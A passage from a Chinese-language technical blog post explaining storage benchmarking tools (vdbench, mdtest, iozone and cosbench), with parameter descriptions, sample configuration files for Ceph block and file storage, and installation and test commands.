(warmup + elapsed) &#x2F; interval，即 (avg_13 - 132) 时间间隔内的平均性能；</li><li><code>maxdata</code> : 读写数据大小，通常情况下，当运行 elapsed 时间后测试结束；当同时指定 elapsed 和 maxdata 参数值时，以最快运行完的参数为准（即 maxdata 测试时间小于 elapsed 时，程序写完 elapsed 数据量后结束）。当参数值为 100 以下时，表示读写数据量为总存储定义大小的倍数（如 maxdata &#x3D; 2 ，2 个存储定义（每个存储定义数据量为 100G ），则实际读写数据大小为 400G ）。当参数值为 100 以上时，表示数据量为实际读写数据量（可以使用单位 M、G、T 等）；</li><li><code>elapsed</code> : 测试运行持续时间（单位为秒），默认值为 30 ；</li><li><code>interval</code> : 报告时间间隔（单位为秒）；</li></ul></li></ul><h3 id="5-1-2、文件存储测试配置参数"><a href="#5-1-2、文件存储测试配置参数" class="headerlink" title="5.1.2、文件存储测试配置参数"></a>5.1.2、文件存储测试配置参数</h3><p><strong>文件存储测试配置参数的定义顺序: HD, FSD, FWD, RD</strong></p><ul><li><code>HD</code> : （ Host Define 主机定义），非必选项，单机运行时不需要配置 HD 参数，一般只有在多主机联机（给多个主机命名，以便在结果中区分）测试时才需要配置；<ul><li><code>hd</code> : 标识主机定义的名称，多主机运行时，可以使用 hd1、hd2、hd3… 区分；</li><li><code>system</code> : 主机 IP 地址或主机名；</li><li><code>vdbench</code> : vdbench 执行文件存放路径，当多主机存放路径不同时，可在hd定义时单独指定；</li><li><code>user</code> : master&#x2F;slave 通信使用用户；</li><li><code>shell</code> : 多主机联机测试时， mater&#x2F;slave 主机间通信方式。可选值为 rsh&#x2F;ssh&#x2F;vdbench，默认值为 rsh 。当参数值为 rsh 时，需要配置 master&#x2F;slave 主机 rsh 互信，考虑到 rsh 使用明文传输，安全级别不够，通常情况下不建议使用这种通信方式。当参数值为 ssh 时，需要配置 master&#x2F;slave 主机 ssh 互信，通常 Linux 主机联机时使用此通信方式。当参数值为 vdbench ，需要在所有 slave 主机运行 vdbench rsh 启用 vdbench 本身的 rsh 守护进程，通常 Window 主机联机时使用此通信方式；</li></ul></li><li><code>FSD</code> : （ File System Define 文件系统定义）；<ul><li><code>fsd</code> : 标识文件系统定义的名称，多文件系统时（fsd1、fsd2、fsd3…），可以指定 default （将相同的参数作为所有fsd的默认值）；</li><li><code>anchor</code> : 文件写入根目录；</li><li><code>depth</code> : 创建目录层级数（即目录深度）；</li><li><code>width</code> : 每层文件夹的子文件夹数；</li><li><code>files</code> : 测试文件个数（ vdbench 测试过程中会生成多层级目录结构，实际只有最后一层目录会生成测试文件）；</li><li><code>size</code> : 每个测试文件大小；</li><li><code>distribution</code> : 可选值为 bottom&#x2F;all ，默认为 bottom 。当参数值为 bottom 时，程序只在最后一层目录写入测试文件。当参数值为 all 时，程序在每一层目录都写入测试文件；</li><li><code>shared</code> : 可选值为 yes&#x2F;no ，默认值为 no 。一般只有在多主机联机测试时指定。vdbench 不允许不同的 slave 之间共享同一个目录结构下的所有文件，因为这样会带来很大的开销，但是它们允许共享同一个目录结构。加入设置了shared&#x3D;yes ，那么不同的 slave 可以平分一个目录下所有的文件来进行访问，相当于每个 slave 有各自等分的访问区域，因此不能测试多个客户的对同一个文件的读写。当多主机联机测试时，写入的根目录 anchor 为同一个路径时，需要指定参数值为 yes ；</li></ul></li><li><code>FWD</code> : （ FileSystem Workload Defile 文件系统工作负载定义）；<ul><li><code>fwd</code> : 标识文件系统工作负载定义的名称，多文件系统工作负载定义时，可以使用 fwd1、fwd2、fwd3… 区分；</li><li><code>fsd</code> : 标识此工作负载使用文件存储定义的名称；</li><li><code>host</code> : 标识此工作负载使用主机；</li><li><code>operation</code> : 文件操作方式，可选值为 read&#x2F;write ；</li><li><code>rdpct</code> : 读操作占比百分比，一般混合读写时需要指定。可选值为 0~100 ，当值为 60 时，则混合读写比为 6:4 ；</li><li><code>fileio</code> : 标识文件 I&#x2F;O 将执行的方式，可选值为 random&#x2F;sequential ；</li><li><code>fileselect</code> : 标识选择文件或目录的方式，可选值为 random&#x2F;sequential ；</li><li><code>xfersize</code> : 数据传输（读取和写入操作）处理的数据大小(即单次 IO 大小)；</li><li><code>threads</code> : 此工作负载的并发线程数量；</li></ul></li><li><code>RD</code> : （ Run Define 运行定义）；<ul><li><code>rd</code> : 标识文件系统运行定义的名称；</li><li><code>fwd</code> : 标识文件系统工作负载定义的名称；</li><li><code>fwdrate</code> : 每秒执行的文件系统操作数量。设置为 max，表示不做任何限制，按照最大强度自适应；</li><li><code>format</code> : 标识预处理目录和文件结构的方式，可选值为 yes&#x2F;no&#x2F;restart 。 yes 表示删除目录和文件结构再重新创建。 no 表示不删除目录和文件结构。 restart 表示只创建未生成的目录或文件，并且增大未达到实际大小的文件；</li><li><code>elapsed</code> : 测试运行持续时间（单位为秒），默认值为 30 ；</li><li><code>interval</code> : 结果输出打印时间间隔（单位为秒）；</li></ul></li></ul><h2 id="5-2、测试命令示例"><a href="#5-2、测试命令示例" class="headerlink" title="5.2、测试命令示例"></a>5.2、测试命令示例</h2><h3 id="5-2-1、块存储测试命令示例"><a href="#5-2-1、块存储测试命令示例" class="headerlink" title="5.2.1、块存储测试命令示例"></a>5.2.1、块存储测试命令示例</h3><p><strong>读写测试配置文件:</strong>（ 该文件完整路径为 &#x2F;root&#x2F;vdbench&#x2F;conf&#x2F;block.conf ）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hd=default,vdbench=/root/vdbench/,user=root,shell=ssh<br>hd=hd1,system=node01<br>hd=hd2,system=node02<br><br>sd=sd1,hd=hd1,lun=/dev/rbd01,openflags=o_direct,threads=6<br>sd=sd2,hd=hd2,lun=/dev/rbd02,openflags=o_direct,threads=6<br><br>wd=wd1,sd=sd1,seekpct=100,rdpct=100,xfersize=4m,skew=100<br>wd=wd2,sd=sd1,seekpct=100,rdpct=50,xfersize=4m,skew=100<br>wd=wd3,sd=sd1,seekpct=100,rdpct=0,xfersize=4m,skew=100<br>wd=wd4,sd=sd2,seekpct=100,rdpct=100,xfersize=4m,skew=100<br>wd=wd5,sd=sd2,seekpct=100,rdpct=50,xfersize=4m,skew=100<br>wd=wd6,sd=sd2,seekpct=100,rdpct=0,xfersize=4m,skew=100<br><br>rd=rd1,wd=wd1,iorate=max,maxdata=50GB,warmup=30,elapsed=100,interval=1<br>rd=rd2,wd=wd2,iorate=max,maxdata=50GB,warmup=30,elapsed=100,interval=1<br>rd=rd3,wd=wd3,iorate=max,maxdata=50GB,warmup=30,elapsed=100,interval=1<br>rd=rd4,wd=wd4,iorate=max,maxdata=50GB,warmup=30,elapsed=100,interval=1<br>rd=rd5,wd=wd5,iorate=max,maxdata=50GB,warmup=30,elapsed=100,interval=1<br>rd=rd6,wd=wd6,iorate=max,maxdata=50GB,warmup=30,elapsed=100,interval=1<br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 运行5秒的块设备测试，用于测试 vdbench 是否可用</span><br>vdbench -t<br><br><span class="hljs-comment"># 实际测试</span><br>vdbench -f /root/vdbench/conf/block.conf<br></code></pre></td></tr></table></figure><h3 id="5-2-2、文件存储测试命令示例"><a href="#5-2-2、文件存储测试命令示例" class="headerlink" title="5.2.2、文件存储测试命令示例"></a>5.2.2、文件存储测试命令示例</h3><p><strong>测试配置文件:</strong>（ 该文件完整路径为 &#x2F;root&#x2F;vdbench&#x2F;conf&#x2F;fs.conf ）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hd=default,vdbench=/root/vdbench/,user=root,shell=ssh<br>hd=hd1,system=node01<br>hd=hd2,system=node02<br><br>fsd=default,depth=2,width=10,files=100,size=4m<br>fsd=fsd1,anchor=/mnt/cephfs/test01<br>fsd=fsd2,anchor=/mnt/cephfs/test02<br><br>fwd=fwd1,fsd=fsd1,host=hd1,operation=write,xfersize=4m,fileio=sequential,fileselect=random,threads=8<br>fwd=fwd2,fsd=fsd2,host=hd2,operation=write,xfersize=4m,fileio=sequential,fileselect=random,threads=8<br>fwd=fwd3,fsd=fsd1,host=hd1,operation=<span class="hljs-built_in">read</span>,xfersize=4m,fileio=sequential,fileselect=random,threads=8<br>fwd=fwd4,fsd=fsd2,host=hd2,operation=<span class="hljs-built_in">read</span>,xfersize=4m,fileio=sequential,fileselect=random,threads=8<br><br>rd=rd1,fwd=(fwd1-fwd2),fwdrate=max,format=restart,elapsed=300,warmup=30,interval=1<br>rd=rd2,fwd=(fwd3-fwd4),fwdrate=max,format=restart,elapsed=300,warmup=30,interval=1<br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 运行5秒的文件系统测试，用于测试 vdbench 是否可用</span><br>vdbench -tf<br><br><span class="hljs-comment"># 实际测试</span><br>vdbench -f /root/vdbench/conf/fs.conf<br></code></pre></td></tr></table></figure><h2 id="5-3、测试结果解析"><a href="#5-3、测试结果解析" class="headerlink" title="5.3、测试结果解析"></a>5.3、测试结果解析</h2><p>测试完成后，vdbench 会将输出结果输出到当前目录的 output 目录中，其中 output 中存在如下文件:</p><ul><li><code>anchors.html</code> : 目录状态报告；</li><li><code>config.html</code> : 脚本 .&#x2F;linux&#x2F;config.sh 的输出信息；</li><li><code>errorlog.html</code> : 运行时的错误日志。当运行测试启用数据校验时，它可能会包含一些错误信息，比如无效的密钥读取，无效的 lba 读取（一个扇区的逻辑字节地址），无效的 SD&#x2F;FSD 名称读取，数据损坏，坏扇区等；</li><li><code>flatfile.html</code> : vdbench 生成的一种逐列的 ASCII 格式的信息，可以使用 parseflat 参数解析结果，可用于生成图表信息；</li><li><code>format.histogram.html</code> : </li><li><code>format.html</code> : fwd 的 format 报告；</li><li><code>fsd1.histogram.html</code> : </li><li><code>fsd1.html</code> : fsd 为 fsd1 的报告；</li><li><code>fwd1.histogram.html</code> : </li><li><code>fwd1.html</code> : fwd 为 fwd1 的报告；</li><li><code>hd1-0.html</code> : Slave&#x3D;hd1-0 的 slave 摘要报告；</li><li><code>hd1-0.stdout.html</code> : slave 的标准输出&#x2F;标准错误&#x3D;hd1-0 ；</li><li><code>hd1.html</code> : hd1 的主机摘要报告；</li><li><code>hd1.var_adm_msgs.html</code> : </li><li><code>histogram.html</code> : 一种包含报告柱状图的响应时间、文本格式的文件，总响应时间直方图；</li><li><code>logfile.html</code> : 包含 Java 代码写入控制台窗口的每行信息的副本，就是终端上运行 vdbench 输出信息的副本，logfile.html 主要用于调试用途；</li><li><code>parmfile.html</code> : 包含测试运行配置参数信息，就是运行时指定的配置文件的副本；</li><li><code>parmscan.html</code> : 解析传入的配置参数文件内容的记录日志；</li><li><code>skew.html</code> : 工作负载偏差报告，仅在以下情况下才会生成偏差信息:有多个工作负载定义 (WD&#x2F;FWD)、存在多个存储定义（SD&#x2F;FSD）、有多个主机、有不止一个奴隶（尽管这些规则有时可能会被忽略）；</li><li><code>status.html</code> : vdbench 运行的状态信息，主要是展示了不同时刻 vdbench 的状态信息；</li><li><code>summary.html</code> : 记录全部数据信息，显示每个报告间隔内总体性能情况及工作负载情况，以及除第一个间隔外的所有间隔的加权平均值，可以查看该文件，然后可以跳转到其他的各文件；</li><li><code>swat_mon.bin</code> : </li><li><code>swat_mon_total.txt</code> : </li><li><code>totals.html</code> : 记录全部数据计算之后的平均值，一般测试结果从该文件取值，除第一个间隔外所有间隔的加权平均值。文件内部一般包含两个部分：第一部分会展示文件存储目录结构及数据填充的平均性能值，其中的 “starting RD&#x3D;format_for_*” 的条目数据是为了初始化测试环境（创建文件夹，空文件等）；第二部分会展示执行测试过程中除第一个时间间隔外所有时间间隔平均性能值（主要看这部分的内容）；</li></ul><h1 id="六、mdtest"><a href="#六、mdtest" class="headerlink" title="六、mdtest"></a>六、mdtest</h1><p><strong>用途:</strong></p><ul><li>测试文件存储元数据性能；</li></ul><p><strong>环境初始化与安装:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装所需依赖</span><br><span class="hljs-comment"># centos</span><br>yum install -y openmpi<br><span class="hljs-comment"># ubuntu</span><br>apt install -y openmpi libopenmpi-dev<br><br><span class="hljs-comment"># 验证依赖</span><br><span class="hljs-built_in">which</span> mpicc mpic++<br><br><span class="hljs-comment"># 编译安装</span><br>git <span class="hljs-built_in">clone</span> https://github.com/hpc/ior.git<br><span class="hljs-built_in">cd</span> ior<br>./bootstrap<br>./configure<br>make<br>make install<br><br><span class="hljs-comment"># 验证安装</span><br><span class="hljs-built_in">which</span> mdtest<br>mdtest -h<br></code></pre></td></tr></table></figure><h2 id="6-1、测试配置参数"><a href="#6-1、测试配置参数" class="headerlink" title="6.1、测试配置参数"></a>6.1、测试配置参数</h2><p><strong>flag 类参数:</strong></p><ul><li><code>-C</code> : 仅创建文件&#x2F;目录。即无此 Flag 时，mdtest 会将测试时创建的文件&#x2F;目录删除，有此 Flag 则会保留这些文件&#x2F;目录；</li><li><code>-T</code> : 仅获取文件&#x2F;目录的状态；</li><li><code>-E</code> : 仅读取文件&#x2F;目录；</li><li><code>-r</code> : 仅删除由之前的测试留下的文件或目录。注意使用时要保留之前测试的参数，才能准确删除期望的内容；</li><li><code>-D</code> : 对目录进行性能测试（不涉及文件），否则每个目录内会一半是文件一半是目录；</li><li><code>-F</code> : 对文件进行性能测试（不涉及目录），否则每个目录内会一半是文件一半是目录；</li><li><code>-k</code> : 使用 mknod 创建文件；</li><li><code>-L</code> : 文件仅在目录树的叶子层，否则每层目录下都会有文件；</li><li><code>-P</code> : 打印速率和时间，默认情况下只打印开始结束时间，以及汇总的速率信息；</li><li><code>--print-all-procs</code> : 所有进程都打印其结果的摘要；</li><li><code>-R</code> : 随机访问文件（仅用于统计）；</li><li><code>-S</code> : 共享文件访问（只有文件，没有目录）；</li><li><code>-c</code> : 集体创建：任务 0 执行所有创建操作；</li><li><code>-t</code> : 计时唯一工作目录的开销；</li><li><code>-u</code> : 每个任务一个工作目录；</li><li><code>-v</code> : 冗长模式（每次使用该选项时增加一级）；</li><li><code>-X</code> : 验证读取的数据</li><li><code>--verify-write</code> : 写入后立即读回数据来验证数据</li><li><code>-y</code> : 写入完成后 sync 文件</li><li><code>-Y</code> : 在每个阶段后调用 sync 命令（包含在计时中；注意这会导致从你的结点 flush 所有 IO）</li><li><code>-Z</code> : 打印时间，而不是速率</li><li><code>--allocateBufferOnGPU</code> : 在 GPU 上分配缓冲区</li><li><code>--warningAsErrors</code> : 任何警告都会导致错误（即将所有警告都视为错误）</li><li><code>--showRankStatistics</code> : 包括每个排名的统计信息</li></ul><p><strong>带参数值类参数:</strong></p><ul><li><code>-a</code> : I&#x2F;O 的 API，取值 POSIX 或 DUMMY。</li><li><code>-b</code> : 层次目录结构的分支因子，其实就是每个目录中含有子目录或者子文件的目录的数量；默认值为 1 ；</li><li><code>-d</code> : 运行测试的目录，可以有多个，用@ 隔开，如 -d&#x3D;.&#x2F;out1@test&#x2F;out2@~&#x2F;out3。默认值为 .&#x2F;out ；</li><li><code>-B</code> : 默认值为 0 ；</li><li><code>-e</code> : 从每个文件读取的字节数。默认值为 0 ；</li><li><code>-f</code> : 测试将运行的任务的起始编号。默认值为 1 ；</li><li><code>-G</code> : 读&#x2F;写缓冲区中数据的偏移量，如果未设置，则使用随机值。默认值为 -1 ；</li><li><code>-i</code> : 测试将运行的迭代次数。默认值为 1 ；</li><li><code>-I</code> : 每个目录中的项目数，默认情况下该值控制每个非空目录中的子文件和子目录的数量。默认值为 0 ；</li><li><code>-l</code> : 测试将运行的任务的最后编号。默认值为 0 ；</li><li><code>-n</code> : 每个进程都会创建&#x2F;统计&#x2F;读取&#x2F;删除 目录和文件。默认值为 0 ；</li><li><code>-N</code> : 每个文件&#x2F;目录操作之间的任务步长（local&#x3D;0；设置为 1 以避免客户端缓存）。默认值为 0 ；</li><li><code>-p</code> : 迭代前延迟（以秒为单位）。默认值为 0 ；</li><li><code>--random-seed</code> : -R 的随机数种子。默认值为 0 ；</li><li><code>-s</code> : 默认值为 1 ；</li><li><code>-V</code> : 详细程度值。与上面 Flag 中的 -v 一样，只是直接设定数字。默认值为 0 ；</li><li><code>-w</code> : 创建每个文件后写入每个文件的字节数。默认值为 0 ；</li><li><code>-W</code> : 以秒为单位的数字；stonewall 计时器，写入尽可能多的秒数并确保所有进程执行相同数量的操作（目前仅在创建阶段和文件期间停止）。默认值为 0 ；</li><li><code>-x</code> : StoneWallingStatusFile，这是一个包含创建阶段迭代次数的文件，可用于在多次运行中拆分阶段。</li><li><code>-z</code> : 层次目录结构的深度，即目录的深度，默认值为 0 ；</li><li><code>--dataPacketType</code> : 可选值 offset&#x2F;incompressible&#x2F;timestamp&#x2F;random&#x2F;o&#x2F;i&#x2F;t&#x2F;r ，默认值为 t ；</li><li><code>--run-cmd-before-phase</code> : </li><li><code>--run-cmd-after-phase</code> : </li><li><code>--saveRankPerformanceDetails</code> :</li></ul><h2 id="6-2、测试命令示例"><a href="#6-2、测试命令示例" class="headerlink" title="6.2、测试命令示例"></a>6.2、测试命令示例</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 测试文件相关性能</span><br><span class="hljs-comment"># 创建3层目录，每层目录中含有10个目录，每个目录中有20个空文件，一共有 10*10*10*20 = 20000 个文件</span><br>mdtest -d /mnt/cephfs/test -z 3 -b 10 -I 20 -F -L<br><br><span class="hljs-comment"># 测试目录相关性能</span><br><span class="hljs-comment"># 创建3层目录，每层目录中含有10个目录，每个目录中有20个空目录，叶节点中一共有 10*10*10*20 = 20000 个目录</span><br>mdtest -d /mnt/cephfs/test -z 3 -b 10 -I 20 -D -L<br><br><span class="hljs-comment"># 并发测试</span><br><span class="hljs-comment"># 不允许使用 root 或者 sudo 运行</span><br>mpiexec -n 8 mdtest -d /mnt/cephfs/test -z 3 -b 10 -I 20 -u -F -P<br></code></pre></td></tr></table></figure><h1 id="七、iozone"><a href="#七、iozone" class="headerlink" title="七、iozone"></a>七、iozone</h1><p><strong>用途:</strong></p><ul><li>测试文件存储性能；</li></ul><p><strong>环境初始化与安装:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 源码编译安装</span><br>wget https://www.iozone.org/src/current/iozone3_506.tar<br>tar -xvf iozone3_506.tar<br><span class="hljs-built_in">cd</span> ./iozone3_506/<br><span class="hljs-built_in">cd</span> ./src/current/<br>make<br>make linux<br><span class="hljs-built_in">ls</span> -al ./<br><span class="hljs-built_in">cp</span> iozone /usr/bin/iozone<br><br><span class="hljs-comment"># 验证安装</span><br><span class="hljs-built_in">which</span> iozone<br>iozone -v<br>iozone -h<br></code></pre></td></tr></table></figure><h2 id="7-1、测试配置参数"><a href="#7-1、测试配置参数" class="headerlink" title="7.1、测试配置参数"></a>7.1、测试配置参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">-a   自动模式<br>-A   自动2模式<br>-b   文件名，创建 Excel 工作表文件<br>-B   使用 mmap() 文件<br>-c   在时间计算中包含关闭操作<br>-C   在吞吐量测试中显示每个子进程传输的字节数<br>-d   从屏障中微秒延迟<br>-D   在 mmap 文件上使用 msync(MS_ASYNC)<br>-e   在时间计算中包含刷新(fsync, fflush)操作<br>-E   运行扩展测试<br>-f   文件名，使用的文件<br>-F   文件名，吞吐量测试中每个进程/线程的文件<br>-g   自动模式下设置最大文件大小（以kBytes为单位）（或 m ，或 g）<br>-G   在 mmap 文件上使用 msync(MS_SYNC)<br>-h   帮助<br>-H   使用 POSIX 异步 I/O 进行#次异步操作<br>-i   要运行的测试<br>        0=write/rewrite, 1=<span class="hljs-built_in">read</span>/re-read, 2=random-read/write<br>        3=Read-backwards, 4=Re-write-record, 5=stride-read, 6=fwrite/re-fwrite<br>        7=fread/Re-fread, 8=random_mix, 9=pwrite/Re-pwrite, 10=pread/Re-pread<br>        11=pwritev/Re-pwritev, 12=preadv/Re-preadv<br>-I   对所有文件操作使用VxFS VX_DIRECT, O_DIRECT或O_DIRECTIO<br>-j   设置文件访问的步幅为(# * 记录大小)<br>-J   每次 I/O 操作前的计算周期毫秒数<br>-k   使用 POSIX 异步 I/O （无bcopy）进行#次异步操作<br>-K   为读者创建访问模式抖动<br>-l   要运行的进程数量下限<br>-L   将处理器缓存行大小设置为值（以字节为单位）<br>-m   使用多个缓冲区<br>-M   报告 <span class="hljs-built_in">uname</span> -a 输出<br>-n   自动模式下设置最小文件大小（以kBytes为单位）（或 m ，或 g）<br>-N   以每次操作的微秒数报告结果<br>-o   写操作是同步的 (O_SYNC)<br>-O   以每秒操作数给出结果<br>-p   清除开启<br>-P   将进程/线程绑定到处理器，从此CPU开始<br>-q   自动模式下设置最大记录大小（以kBytes为单位）（或 m ，或 g）<br>-Q   创建偏移/延迟文件<br>-r   单次操作的大小<br>        或 -r <span class="hljs-comment">#k .. 以kB为单位的大小</span><br>        或 -r <span class="hljs-comment">#m .. 以MB为单位的大小</span><br>        或 -r <span class="hljs-comment">#g .. 以GB为单位的大小</span><br>-R   生成Excel报告<br>-s   文件大小<br>        或 -s <span class="hljs-comment">#k .. 以kB为单位的大小</span><br>        或 -s <span class="hljs-comment">#m .. 以MB为单位的大小</span><br>        或 -s <span class="hljs-comment">#g .. 以GB为单位的大小</span><br>-S   将处理器缓存大小设置为值（以kBytes为单位）<br>-t   吞吐量测试中使用的线程或进程数量<br>-T   使用 POSIX 线程进行吞吐量测试<br>-u   要运行的进程数量上限<br>-U   在测试之间重新挂载挂载点<br>-v   版本信息<br>-V   验证数据模式写/读<br>-w   不取消链接临时文件<br>-W   读取或写入时锁定文件<br>-x   关闭石墙效应<br>-X   文件名，写入遥测文件。包含（偏移量 记录长度 计算时间）的ascii行<br>-y   自动模式下设置最小记录大小（以kBytes为单位）（或# m或# g）<br>-Y   文件名，读取遥测文件。包含（偏移量 记录长度 计算时间）的ascii行<br>-z   与 -a 结合使用以测试所有可能的记录大小<br>-Z   启用 mmap I/O 和文件 I/O 的混合<br>-+b  突发大小（KB），突发之间的睡眠时间（毫秒）<br>-+E  使用现有的非 iozone 文件进行只读测试<br>-+F  在 thread_mix_test 中写入前截断文件<br>-+J  在吞吐量计算中包含思考时间(-j<br>-+K  索尼特别版。手动控制测试8。<br>-+m  集群文件名，启用集群测试<br>-+d  文件 I/O 诊断模式。（用于排除文件 I/O 子系统故障）<br>-+u  启用 CPU 利用率输出（实验性）<br>-+x  用于增加文件和记录大小的乘数<br>-+p  混合中读取的百分比<br>-+r  启用 O_RSYNC|O_SYNC 进行所有测试。<br>-+t  启用网络性能测试。需要 -+m<br>-+n  未选择重新测试。禁用重新定位记录的位置。通常用于防止某些文件系统优化对测试结果的影响，使得测试更加接近真实应用场景。<br>-+k  使用恒定的聚合数据集大小。<br>-+q  测试之间的延迟（秒）。<br>-+l  启用记录锁定模式。<br>-+L  启用记录锁定模式，使用共享文件。<br>-+B  顺序混合工作负载。<br>-+D  启用 O_DSYNC 模式。<br>-+A  启用 madvise 。<br>        0 = normal, 1=random, 2=sequential<br>        3=dontneed, 4=willneed<br>-+N  不在顺序写入时截断现有文件。<br>-+S  可去重数据仅限于在每个数字标识的文件集中共享。<br>-+W  将此值添加到子线程ID，以便在保持与先前存在的文件的正确去重能力的同时添加其他文件，这些文件在同一种子组中（-+S）。<br>-+V  启用共享文件。无锁定。<br>-+X  启用文件系统测试的短路模式。在此模式下，所有结果均无效。<br>-+Z  启用旧数据集兼容模式。警告.. 已发布的<br>        黑客可能会使这些结果无效，并为结果生成虚假的高值。<br>-+w  缓冲区中可去重数据的百分比。<br>-+y  缓冲区中可去重数据在文件内和跨文件的百分比。<br>-+C  缓冲区中可去重数据在文件内但不跨文件的百分比。<br>-+a  可压缩数据的百分比。<br>-+Q  去重粒度大小。<br>-+H  主机名， PIT 服务器的主机名。<br>-+P  服务， PIT 服务器的服务。<br>-+z  启用延迟直方图记录。<br>-+M  启用去重+压缩选项。（实验性）。<br>-+R  启用 iozone 从文件中获取文件名。<br>-+e  启用稀疏而不是在去重区域内和跨去重区域<br></code></pre></td></tr></table></figure><h2 id="7-2、测试命令示例"><a href="#7-2、测试命令示例" class="headerlink" title="7.2、测试命令示例"></a>7.2、测试命令示例</h2><h3 id="7-2-1、单节点测试命令"><a href="#7-2-1、单节点测试命令" class="headerlink" title="7.2.1、单节点测试命令"></a>7.2.1、单节点测试命令</h3><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 当前路径下测试读写性能</span><br><span class="hljs-comment"># 启动 4 个线程，每个线程操作 10g 的文件，每次操作 4m 大小</span><br>iozone -i 0 -i 1 -r 4m -s 10g -t 4 -+n<br></code></pre></td></tr></table></figure><h3 id="7-2-2、多节点测试命令"><a href="#7-2-2、多节点测试命令" class="headerlink" title="7.2.2、多节点测试命令"></a>7.2.2、多节点测试命令</h3><p><strong>测试配置文件:</strong> （文件路径为 &#x2F;etc&#x2F;iozone&#x2F;test.conf）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">node01 /mnt/cephfs01 /usr/bin/iozone<br>node01 /mnt/cephfs01 /usr/bin/iozone<br>node01 /mnt/cephfs01 /usr/bin/iozone<br>node01 /mnt/cephfs01 /usr/bin/iozone<br>node01 /mnt/cephfs01 /usr/bin/iozone<br>node01 /mnt/cephfs01 /usr/bin/iozone<br>node02 /mnt/cephfs02 /usr/bin/iozone<br>node02 /mnt/cephfs02 /usr/bin/iozone<br></code></pre></td></tr></table></figure><p><strong>测试命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在指定机器的指定路径下测试读写性能</span><br><span class="hljs-comment"># 启动 8 个线程，</span><br>/usr/bin/iozone -i 0 -i 1 -r 4m -s 10g -t 8 -+n -+m /etc/iozone/test.conf<br></code></pre></td></tr></table></figure><h1 id="八、cosbench"><a href="#八、cosbench" class="headerlink" title="八、cosbench"></a>八、cosbench</h1><p><strong>用途:</strong></p><ul><li>测试对象存储性能；</li></ul><p><strong>目前社区已经很长时间没有跟进了。</strong></p><p><strong>环境初始化与安装:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cosbench 依赖 java 和 nc</span><br>dnf install java nmap-ncat<br><br><span class="hljs-comment"># 安装 cosbench ，基于 java 开发</span><br><span class="hljs-comment"># 这里建议不要使用 0.4.2 正式版，可能会遇到程序无法启动的问题，参考 https://github.com/intel-cloud/cosbench/issues/380</span><br>wget https://github.com/intel-cloud/cosbench/releases/download/v0.4.2.c4/0.4.2.c4.zip<br>unzip 0.4.2.c4.zip<br><span class="hljs-built_in">cd</span> 0.4.2.c4<br><span class="hljs-built_in">chmod</span> +x ./*.sh<br><br><span class="hljs-comment"># 如果机器为 centos ，在执行下面的脚本时可能会遇到下面的错误:</span><br><span class="hljs-comment"># Ncat: Invalid -i timeout &quot;0&quot; (must be greater than 0 and less than 2147483s). QUITTING.</span><br><span class="hljs-comment"># 解决办法参见: https://github.com/intel-cloud/cosbench/issues/240</span><br><span class="hljs-comment"># 需要修改 cosbench-start.sh 文件中的 TOOL_PARAMS=&quot;-i 0&quot; =&gt; TOOL_PARAMS=&quot;&quot;</span><br><br><span class="hljs-comment"># 启动 Driver , 默认监听端口为 18088</span><br>./start-driver.sh<br><br><span class="hljs-comment"># 启动 Controller , 默认监听端口为 19088</span><br>./start-controller.sh<br><br><span class="hljs-comment"># 使用浏览器访问，注意访问路径需要添加上 /controller/ ，否则无法访问</span><br>http://<span class="hljs-variable">$IPADDR</span>:19088/controller/<br><br><span class="hljs-comment"># 修改 Driver 配置， 修改 name 和 url 信息</span><br><span class="hljs-comment"># 位于 conf/driver.conf 或者 conf/driver_template.conf</span><br><span class="hljs-comment"># cat conf/driver_template.conf</span><br><span class="hljs-built_in">cat</span> conf/driver.conf<br><br><span class="hljs-comment"># 修改 Controller 配置， 修改 driver 数量，日志级别， driver name 和 driver ip 等信息</span><br><span class="hljs-comment"># 位于 conf/controller.conf</span><br><span class="hljs-built_in">cat</span> conf/controller.conf<br></code></pre></td></tr></table></figure><h2 id="8-1、测试配置参数"><a href="#8-1、测试配置参数" class="headerlink" title="8.1、测试配置参数"></a>8.1、测试配置参数</h2><p>测试任务的配置文件位于 conf 目录中，这里解释 s3-config-sample.xml 文件。</p><p><strong>配置详情:</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">workload</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;s3-sample&quot;</span> <span class="hljs-attr">description</span>=<span class="hljs-string">&quot;sample benchmark for s3&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">storage</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;s3&quot;</span> <span class="hljs-attr">config</span>=<span class="hljs-string">&quot;accesskey=&lt;accesskey&gt;;secretkey=&lt;scretkey&gt;;proxyhost=&lt;proxyhost&gt;;proxyport=&lt;proxyport&gt;;endpoint=&lt;endpoint&gt;&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">workflow</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">workstage</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;init&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">work</span> <span class="hljs-attr">type</span>=<span 